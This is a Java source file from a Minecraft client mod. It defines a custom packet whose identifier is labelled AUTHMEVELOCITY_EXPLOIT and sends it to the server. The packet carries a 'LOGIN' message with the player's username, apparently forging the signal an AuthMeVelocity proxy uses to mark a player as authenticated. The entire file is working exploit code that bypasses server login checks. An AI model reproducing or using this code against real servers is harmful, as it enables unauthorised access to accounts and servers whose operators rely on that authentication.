package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import java.util.Objects;

public record AuthMeVelocityPayloadPacket() implements CustomPayload {

    public static final Id<AuthMeVelocityPayloadPacket> ID = new Id<>(IdentifierConstants.AUTHMEVELOCITY_EXPLOIT);
    public static final PacketCodec<PacketByteBuf, AuthMeVelocityPayloadPacket> CODEC = CustomPayload.codecOf(AuthMeVelocityPayloadPacket::write, AuthMeVelocityPayloadPacket::new);

    /**
     * Constructs a new AuthMeVelocityPayloadPacket from the provided buffer.
     *
     * @param buf The buffer containing the serialized data for the packet.
     */
    private AuthMeVelocityPayloadPacket(PacketByteBuf buf) {
        this();
    }

    /**
     * Sends the custom payload packet to the server.
     */
    public static void send() {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new AuthMeVelocityPayloadPacket()));
    }

    /**
     * Writes the packet data to the provided buffer.
     *
     * @param buf The buffer to write the packet data to.
     */
    private void write(PacketByteBuf buf) {
        buf.writeByte(0);
        buf.writeString("LOGIN");
        buf.writeByte(0);
        buf.writeString(MinecraftClient.getInstance().getGameProfile().getName());
    }

    /**
     * Gets the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet.
     */
    public Id<AuthMeVelocityPayloadPacket> getId() {
        return ID;
    }
}
